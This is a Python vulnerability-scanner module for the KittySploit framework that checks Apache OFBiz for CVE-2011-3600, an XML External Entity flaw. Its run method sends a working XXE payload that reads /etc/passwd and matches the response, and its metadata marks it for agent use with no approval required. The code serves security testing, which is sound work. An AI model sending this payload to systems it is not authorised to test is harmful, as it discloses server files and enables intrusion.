#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The /webtools/control/xmlrpc endpoint in OFBiz XML-RPC event handler is exposed to External Entity Injection b."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Apache OFBiz - XML External Entity Injection Detection',
        'description': 'The /webtools/control/xmlrpc endpoint in OFBiz XML-RPC event handler is exposed to External Entity Injection by passing DOCTYPE declarations with executable payloads that discloses the contents of files in the filesystem. In addition, it can also be used to probe for open network ports, and figure out from returned error messages whether a file exists or not. This affects OFBiz 16.11.01 to 16.11.04.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2011', 'apache', 'ofbiz', 'xxe', 'vuln', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://lists.apache.org/thread/cwz2v0b6pnxvqrnsd0hj3l80g9qq5kd8',
            'https://nvd.nist.gov/vuln/detail/CVE-2011-3600',
        ],
        'cve': 'CVE-2011-3600',
    }

    def run(self):
        path = '/webtools/control/xmlrpc'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/xml'}, data='<?xml version="1.0"?><!DOCTYPE x [<!ENTITY disclose SYSTEM "file:////etc/passwd">]><methodCall><methodName>&disclose;</methodName></methodCall>\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:', 'faultString',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='high', reason='Apache OFBiz - XML External Entity Injection detected', path=path)
            return True
        return False

